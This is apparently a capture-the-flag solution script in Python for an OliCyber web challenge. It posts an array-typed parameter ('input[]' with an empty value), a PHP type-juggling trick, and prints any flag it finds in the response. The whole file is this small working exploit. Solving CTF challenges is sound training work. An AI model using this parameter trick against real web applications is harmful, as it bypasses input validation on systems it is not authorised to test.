import requests

url='http://soundofsilence.challs.olicyber.it'
payload = {'input[]':""}

r = requests.post(url, data=payload).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)